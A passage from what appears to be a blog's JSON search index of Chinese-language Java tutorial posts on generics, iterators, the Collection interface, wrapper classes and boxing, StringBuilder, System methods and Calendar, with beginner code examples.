show02(); &#125; private static void show02() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"abc\"); //list.add(1);//add(java.lang.String)in ArrayList cannot be applied to (int) //使用迭代器遍历list集合 Iterator&lt;String&gt; it = list.iterator(); while(it.hasNext())&#123; String s = it.next(); System.out.println(s+\"-&gt;\"+s.length()); &#125; &#125; /* 创建集合对象,不使用泛型 好处: 集合不使用泛型,默认的类型就是Object类型,可以存储任意类型的数据 弊端: 不安全,会引发异常 */ private static void show01() &#123; ArrayList list = new ArrayList(); list.add(\"abc\"); list.add(1); //使用迭代器遍历list集合 //获取迭代器 Iterator it = list.iterator(); //使用迭代器中的方法hasNext和next遍历集合 while(it.hasNext())&#123; //取出元素也是Object类型 Object obj = it.next(); System.out.println(obj); //想要使用String类特有的方法,length获取字符串的长度;不能使用 多态 Object obj = \"abc\"; //需要向下转型 //会抛出ClassCastException类型转换异常,不能把Integer类型转换为String类型 String s = (String)obj; System.out.println(s.length()); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java泛型的概念","slug":"java00157泛型的概念","date":"2020-03-16T03:04:45.000Z","updated":"2020-03-16T03:06:37.802Z","comments":true,"path":"2020/03/16/java00157泛型的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00157泛型的概念/","excerpt":"","text":"java泛型的概念 在前面学习集合时，我们都知道集合中是可以存放任意对象的，只要把对象存储集合后，那么这时他们都会被提升成Object类型。当我们在取出每一个对象，并且进行相应的操作，这时必须采用类型转换。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java增强for循环","slug":"java00156增强for循环","date":"2020-03-16T01:55:15.000Z","updated":"2020-03-21T14:59:03.006Z","comments":true,"path":"2020/03/16/java00156增强for循环/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00156增强for循环/","excerpt":"","text":"java增强for循环 增强for循环: 底层使用的也是迭代器,使用for循环的格式,简化了迭代器的书写 是JDK1.5之后出现的新特性 Collection&lt;E&gt; extends Iterable&lt;E&gt;:所有的单列集合都可以使用增强for public interface Iterable&lt;T&gt;实现这个接口允许对象成为 “foreach” 语句的目标。 增强for循环: 用来遍历集合和数组 格式: 123for(集合/数组的数据类型 变量名: 集合名/数组名)&#123;sout(变量名);&#125; 1234567891011121314151617181920212223242526272829package com.itheima.demo02.Iterator;import java.util.ArrayList;public class Demo02Foreach &#123; public static void main(String[] args) &#123; demo02(); &#125; //使用增强for循环遍历集合 private static void demo02() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"aaa\"); list.add(\"bbb\"); list.add(\"ccc\"); list.add(\"ddd\"); for(String s : list)&#123; System.out.println(s); &#125; &#125; //使用增强for循环遍历数组 private static void demo01() &#123; int[] arr = &#123;1,2,3,4,5&#125;; for(int i:arr)&#123; System.out.println(i); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java迭代器的实现原理","slug":"java00155迭代器的实现原理","date":"2020-03-16T01:52:26.000Z","updated":"2020-03-16T01:53:01.867Z","comments":true,"path":"2020/03/16/java00155迭代器的实现原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00155迭代器的实现原理/","excerpt":"","text":"java迭代器的实现原理","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java迭代器的代码实现","slug":"java00154迭代器的代码实现","date":"2020-03-16T01:31:18.000Z","updated":"2020-03-16T01:33:26.732Z","comments":true,"path":"2020/03/16/java00154迭代器的代码实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00154迭代器的代码实现/","excerpt":"","text":"java迭代器的代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.itheima.demo02.Iterator;import java.util.ArrayList;import java.util.Collection;import java.util.Iterator;public class Demo01Iterator &#123; public static void main(String[] args) &#123; //创建一个集合对象 Collection&lt;String&gt; coll = new ArrayList&lt;&gt;(); //往集合中添加元素 coll.add(\"姚明\"); coll.add(\"科比\"); coll.add(\"麦迪\"); coll.add(\"詹姆斯\"); coll.add(\"艾弗森\"); /* 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) 注意: Iterator&lt;E&gt;接口也是有泛型的,迭代器的泛型跟着集合走,集合是什么泛型,迭代器就是什么泛型 */ //多态 接口 实现类对象 Iterator&lt;String&gt; it = coll.iterator(); /* 发现使用迭代器取出集合中元素的代码,是一个重复的过程 所以我们可以使用循环优化 不知道集合中有多少元素,使用while循环 循环结束的条件,hasNext方法返回false */ while(it.hasNext())&#123; String e = it.next(); System.out.println(e); &#125; System.out.println(\"----------------------\"); for(Iterator&lt;String&gt; it2 = coll.iterator();it2.hasNext();)&#123; String e = it2.next(); System.out.println(e); &#125; /* //2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 boolean b = it.hasNext(); System.out.println(b);//true //3.使用Iterator接口中的方法next取出集合中的下一个元素 String s = it.next(); System.out.println(s);//姚明 b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b);//没有元素,返回false s = it.next();//没有元素,在取出元素会抛出NoSuchElementException没有元素异常 System.out.println(s);*/ &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Iterator接口介绍","slug":"java00153Iterator接口介绍","date":"2020-03-16T01:25:33.000Z","updated":"2020-03-21T14:58:04.216Z","comments":true,"path":"2020/03/16/java00153Iterator接口介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00153Iterator接口介绍/","excerpt":"","text":"java Iterator接口介绍 java.util.Iterator接口: 迭代器(对集合进行遍历) 有两个常用的方法 boolean hasNext() 如果仍有元素可以迭代，则返回 true。 判断集合中还有没有下一个元素,有就返回true,没有就返回false E next() 返回迭代的下一个元素。 取出集合中的下一个元素 Iterator迭代器,是一个接口,我们无法直接使用,需要使用Iterator接口的实现类对象,获取实现类的方式比较特殊 Collection接口中有一个方法,叫iterator(),这个方法返回的就是迭代器的实现类对象 Iterator&lt;E&gt; iterator() 返回在此 collection 的元素上进行迭代的迭代器。 迭代器的使用步骤(重点): 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) 2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 3.使用Iterator接口中的方法next取出集合中的下一个元素","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaCollection集合常用功能","slug":"java00152Collection集合常用功能","date":"2020-03-16T01:15:46.000Z","updated":"2020-03-16T01:21:55.456Z","comments":true,"path":"2020/03/16/java00152Collection集合常用功能/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00152Collection集合常用功能/","excerpt":"","text":"java Collection集合常用功能 java.util.Collection接口 所有单列集合的最顶层的接口,里边定义了所有单列集合共性的方法 任意的单列集合都可以使用Collection接口中的方法 共性的方法: public boolean add(E e)：把给定的对象添加到当前集合中 。 public void clear() :清空集合中所有的元素。 public boolean remove(E e): 把给定的对象在当前集合中删除。 public boolean contains(E e): 判断当前集合中是否包含给定的对象。 public boolean isEmpty(): 判断当前集合是否为空。 public int size(): 返回集合中元素的个数。 public Object[] toArray(): 把集合中的元素，存储到数组中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package com.itheima.demo01.Collection;import java.util.ArrayList;import java.util.Collection;import java.util.HashSet;public class Demo01Collection &#123; public static void main(String[] args) &#123; //创建集合对象,可以使用多态 //Collection&lt;String&gt; coll = new ArrayList&lt;&gt;(); Collection&lt;String&gt; coll = new HashSet&lt;&gt;(); System.out.println(coll);//重写了toString方法 [] /* public boolean add(E e)： 把给定的对象添加到当前集合中 。 返回值是一个boolean值,一般都返回true,所以可以不用接收 */ boolean b1 = coll.add(\"张三\"); System.out.println(\"b1:\"+b1);//b1:true System.out.println(coll);//[张三] coll.add(\"李四\"); coll.add(\"李四\"); coll.add(\"赵六\"); coll.add(\"田七\"); System.out.println(coll);//[张三, 李四, 赵六, 田七] /* public boolean remove(E e): 把给定的对象在当前集合中删除。 返回值是一个boolean值,集合中存在元素,删除元素,返回true 集合中不存在元素,删除失败,返回false */ boolean b2 = coll.remove(\"赵六\"); System.out.println(\"b2:\"+b2);//b2:true boolean b3 = coll.remove(\"赵四\"); System.out.println(\"b3:\"+b3);//b3:false System.out.println(coll);//[张三, 李四, 田七] /* public boolean contains(E e): 判断当前集合中是否包含给定的对象。 包含返回true 不包含返回false */ boolean b4 = coll.contains(\"李四\"); System.out.println(\"b4:\"+b4);//b4:true boolean b5 = coll.contains(\"赵四\"); System.out.println(\"b5:\"+b5);//b5:false //public boolean isEmpty(): 判断当前集合是否为空。 集合为空返回true,集合不为空返回false boolean b6 = coll.isEmpty(); System.out.println(\"b6:\"+b6);//b6:false //public int size(): 返回集合中元素的个数。 int size = coll.size(); System.out.println(\"size:\"+size);//size:3 //public Object[] toArray(): 把集合中的元素，存储到数组中。 Object[] arr = coll.toArray(); for (int i = 0; i &lt; arr.length; i++) &#123; System.out.println(arr[i]); &#125; //public void clear() :清空集合中所有的元素。但是不删除集合,集合还存在 coll.clear(); System.out.println(coll);//[] System.out.println(coll.isEmpty());//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集合框架介绍","slug":"java00151集合框架介绍","date":"2020-03-16T01:11:41.000Z","updated":"2020-03-16T01:49:00.235Z","comments":true,"path":"2020/03/16/java00151集合框架介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00151集合框架介绍/","excerpt":"","text":"集合框架介绍 JAVASE提供了满足各种需求的API，在使用这些API前，先了解其继承与接口操作架构，才能了解何时采用哪个类，以及类之间如何彼此合作，从而达到灵活应用。 集合按照其存储结构可以分为两大类，分别是单列集合java.util.Collection和双列集合java.util.Map，今天我们主要学习Collection集合，在day04时讲解Map集合。 Collection：单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是java.util.List和java.util.Set。其中，List的特点是元素有序、元素可重复。Set的特点是元素无序，而且不可重复。List接口的主要实现类有java.util.ArrayList和java.util.LinkedList，Set接口的主要实现类有java.util.HashSet和java.util.TreeSet。 从上面的描述可以看出JDK中提供了丰富的集合类库，为了便于初学者进行系统地学习，接下来通过一张图来描述整个集合类的继承体系。 其中，橙色框里填写的都是接口类型，而蓝色框里填写的都是具体的实现类。这几天将针对图中所列举的集合类进行逐一地讲解。 集合本身是一个工具，它存放在java.util包中。在Collection接口定义着单列集合框架中最最共性的内容。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Coolection集合概述","slug":"java00150Coolection集合概述","date":"2020-03-16T01:07:15.000Z","updated":"2020-03-21T14:57:33.786Z","comments":true,"path":"2020/03/16/java00150Coolection集合概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00150Coolection集合概述/","excerpt":"","text":"Coolection集合概述 在前面基础班我们已经学习过并使用过集合ArrayList&lt;E&gt; ,那么集合到底是什么呢? 集合：集合是java中提供的一种容器，可以用来存储多个数据。 集合和数组既然都是容器，它们有啥区别呢？ 数组的长度是固定的。集合的长度是可变的。 数组中存储的是同一类型的元素，可以存储基本数据类型值。集合存储的都是对象。而且对象的类型可以不一致。在开发中一般当对象多的时候，使用集合进行存储。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_基本类型与字符串类型之间的相互转","slug":"java00149包装类-基本类型与字符串类型之间的相互转","date":"2020-03-15T01:26:47.000Z","updated":"2020-03-15T01:30:58.669Z","comments":true,"path":"2020/03/15/java00149包装类-基本类型与字符串类型之间的相互转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00149包装类-基本类型与字符串类型之间的相互转/","excerpt":"","text":"java 包装类_基本类型与字符串类型之间的相互转 ​ 基本类型与字符串类型之间的相互转换 基本类型-&gt;字符串(String) ​ 1.基本类型的值+&quot;&quot; 最简单的方法(工作中常用) ​ 2.包装类的静态方法toString(参数),不是Object类的toString() 重载 ​ static String toString(int i) 返回一个表示指定整数的 String 对象。 ​ 3.String类的静态方法valueOf(参数) ​ static String valueOf(int i) 返回 int 参数的字符串表示形式。 字符串(String)-&gt;基本类型 public static byte parseByte(String s)：将字符串参数转换为对应的byte基本类型。 public static short parseShort(String s)：将字符串参数转换为对应的short基本类型。 public static int parseInt(String s)：将字符串参数转换为对应的int基本类型。 public static long parseLong(String s)：将字符串参数转换为对应的long基本类型。 public static float parseFloat(String s)：将字符串参数转换为对应的float基本类型。 public static double parseDouble(String s)：将字符串参数转换为对应的double基本类型。 public static boolean parseBoolean(String s)：将字符串参数转换为对应的boolean基本类型。 ​ 使用包装类的静态方法parseXXX(“字符串”); ​ Integer类: static int parseInt(String s) ​ Double类: static double parseDouble(String s) 1234567891011121314151617181920212223package com.itheima.demo07Integer;public class Demo03Integer &#123; public static void main(String[] args) &#123; //基本类型-&gt;字符串(String) int i1 = 100; String s1 = i1+\"\"; System.out.println(s1+200);//100200 String s2 = Integer.toString(100); System.out.println(s2+200);//100200 String s3 = String.valueOf(100); System.out.println(s3+200);//100200 //字符串(String)-&gt;基本类型 int i = Integer.parseInt(s1); System.out.println(i-10); int a = Integer.parseInt(\"a\");//NumberFormatException System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_自动装箱与自动拆箱","slug":"java00148包装类-自动装箱与自动拆箱","date":"2020-03-15T01:24:06.000Z","updated":"2020-03-15T01:25:14.727Z","comments":true,"path":"2020/03/15/java00148包装类-自动装箱与自动拆箱/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00148包装类-自动装箱与自动拆箱/","excerpt":"","text":"java包装类_自动装箱与自动拆箱 自动装箱与自动拆箱:基本类型的数据和包装类之间可以自动的相互转换 JDK1.5之后出现的新特性 1234567891011121314151617181920212223242526272829package com.itheima.demo07Integer;import java.util.ArrayList;public class Demo02Ineger &#123; public static void main(String[] args) &#123; /* 自动装箱:直接把int类型的整数赋值包装类 Integer in = 1; 就相当于 Integer in = new Integer(1); */ Integer in = 1; /* 自动拆箱:in是包装类,无法直接参与运算,可以自动转换为基本数据类型,在进行计算 in+2;就相当于 in.intVale() + 2 = 3 in = in.intVale() + 2 = 3 又是一个自动装箱 */ in = in+2; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); /* ArrayList集合无法直接存储整数,可以存储Integer包装类 */ list.add(1); //--&gt;自动装箱 list.add(new Integer(1)); int a = list.get(0); //--&gt;自动拆箱 list.get(0).intValue(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_装箱与拆箱","slug":"java00147包装类-装箱与拆箱","date":"2020-03-15T01:15:57.000Z","updated":"2020-03-15T01:22:51.786Z","comments":true,"path":"2020/03/15/java00147包装类-装箱与拆箱/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00147包装类-装箱与拆箱/","excerpt":"","text":"java包装类_装箱与拆箱 装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) 构造方法: ​ Integer(int value) 构造一个新分配的 Integer 对象，它表示指定的 int 值。 ​ Integer(String s) 构造一个新分配的 Integer 对象，它表示 String 参数所指示的 int 值。 ​ 传递的字符串,必须是基本类型的字符串,否则会抛出异常 “100” 正确 “a” 抛异常 静态方法: ​ static Integer valueOf(int i) 返回一个表示指定的 int 值的 Integer 实例。 ​ static Integer valueOf(String s) 返回保存指定的 String 的值的 Integer 对象。 ​ 拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) 成员方法: ​ int intValue() 以 int 类型返回该 Integer 的值。 12345678910111213141516171819202122232425package com.itheima.demo07Integer;public class Demo01Integer &#123; public static void main(String[] args) &#123; //装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) //构造方法 Integer in1 = new Integer(1);//方法上有横线,说明方法过时了 System.out.println(in1);//1 重写了toString方法 Integer in2 = new Integer(\"1\"); System.out.println(in2);//1 //静态方法 Integer in3 = Integer.valueOf(1); System.out.println(in3); //Integer in4 = Integer.valueOf(\"a\");//NumberFormatException数字格式化异常 Integer in4 = Integer.valueOf(\"1\"); System.out.println(in4); //拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) int i = in1.intValue(); System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类的概念","slug":"java00146包装类的概念","date":"2020-03-15T01:09:51.000Z","updated":"2020-03-15T01:14:33.524Z","comments":true,"path":"2020/03/15/java00146包装类的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00146包装类的概念/","excerpt":"","text":"java包装类的概念 基本数据类型转包装类类型 基本类型 对应的包装类（位于java.lang包中） byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean ​ 装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) 构造方法: Integer(int value) 构造一个新分配的 Integer 对象，它表示指定的 int 值。 Integer(String s) 构造一个新分配的 Integer 对象，它表示 String 参数所指示的 int 值。 传递的字符串,必须是基本类型的字符串,否则会抛出异常 “100” 正确 “a” 抛异常 静态方法: static Integer valueOf(int i) 返回一个表示指定的 int 值的 Integer 实例。 static Integer valueOf(String s) 返回保存指定的 String 的值的 Integer 对象。 拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) 成员方法: ​ int intValue() 以 int 类型返回该 Integer 的值。 12345678910111213141516171819202122232425package com.itheima.demo07Integer;public class Demo01Integer &#123; public static void main(String[] args) &#123; //装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) //构造方法 Integer in1 = new Integer(1);//方法上有横线,说明方法过时了 System.out.println(in1);//1 重写了toString方法 Integer in2 = new Integer(\"1\"); System.out.println(in2);//1 //静态方法 Integer in3 = Integer.valueOf(1); System.out.println(in3); //Integer in4 = Integer.valueOf(\"a\");//NumberFormatException数字格式化异常 Integer in4 = Integer.valueOf(\"1\"); System.out.println(in4); //拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) int i = in1.intValue(); System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java StringBuilder的toString方法","slug":"java00145StringBuilder的toString方法","date":"2020-03-15T00:33:49.000Z","updated":"2020-03-15T00:37:21.578Z","comments":true,"path":"2020/03/15/java00145StringBuilder的toString方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00145StringBuilder的toString方法/","excerpt":"","text":"java StringBuilder的toString方法 StringBuilder和String可以相互转换: String-&gt;StringBuilder:可以使用StringBuilder的构造方法 StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 StringBuilder-&gt;String:可以使用StringBuilder中的toString方法 public String toString()：将当前StringBuilder对象转换为String对象。 1234567891011121314151617package com.itheima.demo06StringBuilder;public class Demo03StringBuilder &#123; public static void main(String[] args) &#123; //String-&gt;StringBuilder String str = \"hello\"; System.out.println(\"str:\"+str); StringBuilder bu = new StringBuilder(str); //往StringBuilder中添加数据 bu.append(\"world\"); System.out.println(\"bu:\"+bu); //StringBuilder-&gt;String String s = bu.toString(); System.out.println(\"s:\"+s); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaStringBuilder的构造方法和append方法","slug":"java00144StringBuilder的构造方法和append方法","date":"2020-03-15T00:30:13.000Z","updated":"2020-03-15T00:32:56.966Z","comments":true,"path":"2020/03/15/java00144StringBuilder的构造方法和append方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00144StringBuilder的构造方法和append方法/","excerpt":"","text":"javaStringBuilder的构造方法和append方法 java.lang.StringBuilder类:字符串缓冲区,可以提高字符串的效率 构造方法: ​ StringBuilder() 构造一个不带任何字符的字符串生成器，其初始容量为 16 个字符。 ​ StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 StringBuilder的常用方法: ​ public StringBuilder append(…)：添加任意类型数据的字符串形式，并返回当前对象自身。 12345678910111213package com.itheima.demo06StringBuilder;public class Demo01StringBuilder &#123; public static void main(String[] args) &#123; //空参数构造方法 StringBuilder bu1 = new StringBuilder(); System.out.println(\"bu1:\"+bu1);//bu1:\"\" //带字符串的构造方法 StringBuilder bu2 = new StringBuilder(\"abc\"); System.out.println(\"bu2:\"+bu2);//bu2:abc &#125;&#125; 123456789101112131415161718192021222324252627282930package com.itheima.demo06StringBuilder;public class Demo02StringBuilder &#123; public static void main(String[] args) &#123; //创建StringBuilder对象 StringBuilder bu = new StringBuilder(); //使用append方法往StringBuilder中添加数据 //append方法返回的是this,调用方法的对象bu,this==bu //StringBuilder bu2 = bu.append(\"abc\");//把bu的地址赋值给了bu2 //System.out.println(bu);//\"abc\" //System.out.println(bu2);//\"abc\" //System.out.println(bu==bu2);//比较的是地址 true //使用append方法无需接收返回值// bu.append(\"abc\");// bu.append(1);// bu.append(true);// bu.append(8.8);// bu.append('中');// System.out.println(bu);//abc1true8.8中 /* 链式编程:方法返回值是一个对象,可以继续调用方法 */ System.out.println(\"abc\".toUpperCase().toLowerCase().toUpperCase().toLowerCase()); bu.append(\"abc\").append(1).append(true).append(8.8).append('中'); System.out.println(bu);//abc1true8.8中 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaStringBuilder的原理","slug":"java00143StringBuilder的原理","date":"2020-03-15T00:26:49.000Z","updated":"2020-03-15T00:29:04.265Z","comments":true,"path":"2020/03/15/java00143StringBuilder的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00143StringBuilder的原理/","excerpt":"","text":"javaStringBuilder的原理","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaSystem类的常用方法","slug":"java00142System类的常用方法","date":"2020-03-15T00:23:25.000Z","updated":"2020-03-15T00:25:14.188Z","comments":true,"path":"2020/03/15/java00142System类的常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00142System类的常用方法/","excerpt":"","text":"System类的常用方法 ​ java.lang.System类中提供了大量的静态方法，可以获取与系统相关的信息或系统级操作，在System类的API文档中，常用的方法有： ​ public static long currentTimeMillis()：返回以毫秒为单位的当前时间。 ​ public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)：将数组中指定的数据拷贝到另一个数组中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.itheima.demo05.System;import java.util.Arrays;public class Demo01System &#123; public static void main(String[] args) &#123; demo02(); StringBuilder sb = new StringBuilder(); &#125; /* public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)：将数组中指定的数据拷贝到另一个数组中。 参数: src - 源数组。 srcPos - 源数组中的起始位置(起始索引)。 dest - 目标数组。 destPos - 目标数据中的起始位置。 length - 要复制的数组元素的数量。 练习: 将src数组中前3个元素，复制到dest数组的前3个位置上 复制元素前： src数组元素[1,2,3,4,5]，dest数组元素[6,7,8,9,10] 复制元素后： src数组元素[1,2,3,4,5]，dest数组元素[1,2,3,9,10] */ private static void demo02() &#123; //定义源数组 int[] src = &#123;1,2,3,4,5&#125;; //定义目标数组 int[] dest = &#123;6,7,8,9,10&#125;; System.out.println(\"复制前:\"+ Arrays.toString(dest)); //使用System类中的arraycopy把源数组的前3个元素复制到目标数组的前3个位置上 System.arraycopy(src,0,dest,0,3); System.out.println(\"复制后:\"+ Arrays.toString(dest)); &#125; /* public static long currentTimeMillis()：返回以毫秒为单位的当前时间。 用来程序的效率 验证for循环打印数字1-9999所需要使用的时间（毫秒） */ private static void demo01() &#123; //程序执行前,获取一次毫秒值 long s = System.currentTimeMillis(); //执行for循环 for (int i = 1; i &lt;=9999 ; i++) &#123; System.out.println(i); &#125; //程序执行后,获取一次毫秒值 long e = System.currentTimeMillis(); System.out.println(\"程序共耗时:\"+(e-s)+\"毫秒\");//程序共耗时:106毫秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaCalendar类的常用成员方法","slug":"java00141Calendar类的常用成员方法","date":"2020-03-15T00:19:23.000Z","updated":"2020-03-15T00:20:50.725Z","comments":true,"path":"2020/03/15/java00141Calendar类的常用成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00141Calendar类的常用成员方法/","excerpt":"","text":"java Calendar类的常用成员方法 Calendar类的常用成员方法: public int get(int field)：返回给定日历字段的值。 public void set(int field, int value)：将给定的日历字段设置为给定值。 public abstract void add(int field, int amount)：根据日历的规则，为给定的日历字段添加或减去指定的时间量。 public Date getTime()：返回一个表示此Calendar时间值（从历元到现在的毫秒偏移量）的Date对象。 成员方法的参数: int field:日历类的字段,可以使用Calendar类的静态成员变量获取 public static final int YEAR = 1; 年 public static final int MONTH = 2; 月 public static final int DATE = 5; 月中的某一天 public static final int DAY_OF_MONTH = 5;月中的某一天 public static final int HOUR = 10; 时 public static final int MINUTE = 12; 分 public static final int SECOND = 13; 秒 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102package com.itheima.demo04.Calendar;import java.util.Calendar;import java.util.Date;public class Demo02Calendar &#123; public static void main(String[] args) &#123; demo04(); &#125; /* public Date getTime()：返回一个表示此Calendar时间值（从历元到现在的毫秒偏移量）的Date对象。 把日历对象,转换为日期对象 */ private static void demo04() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); Date date = c.getTime(); System.out.println(date); &#125; /* public abstract void add(int field, int amount)：根据日历的规则，为给定的日历字段添加或减去指定的时间量。 把指定的字段增加/减少指定的值 参数: int field:传递指定的日历字段(YEAR,MONTH...) int amount:增加/减少指定的值 正数:增加 负数:减少 */ private static void demo03() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); //把年增加2年 c.add(Calendar.YEAR,2); //把月份减少3个月 c.add(Calendar.MONTH,-3); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 //int date = c.get(Calendar.DAY_OF_MONTH); int date = c.get(Calendar.DATE); System.out.println(date); &#125; /* public void set(int field, int value)：将给定的日历字段设置为给定值。 参数: int field:传递指定的日历字段(YEAR,MONTH...) int value:给指定字段设置的值 */ private static void demo02() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); //设置年为9999 c.set(Calendar.YEAR,9999); //设置月为9月 c.set(Calendar.MONTH,9); //设置日9日 c.set(Calendar.DATE,9); //同时设置年月日,可以使用set的重载方法 c.set(8888,8,8); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 int date = c.get(Calendar.DATE); System.out.println(date); &#125; /* public int get(int field)：返回给定日历字段的值。 参数:传递指定的日历字段(YEAR,MONTH...) 返回值:日历字段代表的具体的值 */ private static void demo01() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 //int date = c.get(Calendar.DAY_OF_MONTH); int date = c.get(Calendar.DATE); System.out.println(date); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Calendar类介绍_获取对象的方式","slug":"java00140Calendar类介绍-获取对象的方式","date":"2020-03-15T00:15:16.000Z","updated":"2020-03-15T00:18:26.786Z","comments":true,"path":"2020/03/15/java00140Calendar类介绍-获取对象的方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00140Calendar类介绍-获取对象的方式/","excerpt":"","text":"Calendar类介绍_获取对象的方式 java.util.Calendar类: 日历类Calendar类是一个抽象类,里边提供了很多操作日历字段的方法(YEAR、MONTH、DAY_OF_MONTH、HOUR ) Calendar类无法直接创建对象使用,里边有一个静态方法叫getInstance(),该方法返回了Calendar类的子类对象 static Calendar getInstance() 使用默认时区和语言环境获得一个日历。 123456789101112package com.itheima.demo04.Calendar;import java.util.Calendar;public class Demo01Calendar &#123; public static void main(String[] args) &#123; Calendar c = Calendar.getInstance();//多态 System.out.println(c); 